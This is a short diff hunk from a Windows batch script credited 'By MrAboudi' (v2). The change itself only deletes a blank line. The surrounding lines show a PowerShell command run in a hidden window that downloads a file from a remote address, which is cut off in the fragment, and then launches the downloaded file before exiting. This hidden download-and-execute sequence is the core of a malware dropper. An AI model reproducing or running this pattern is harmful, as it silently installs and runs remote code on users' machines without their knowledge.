@@ -21,6 +21,5 @@ powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile
 start "" "%TARGET_FILE%"
 exit
 
-
 :: By MrAboudi
 :: v2
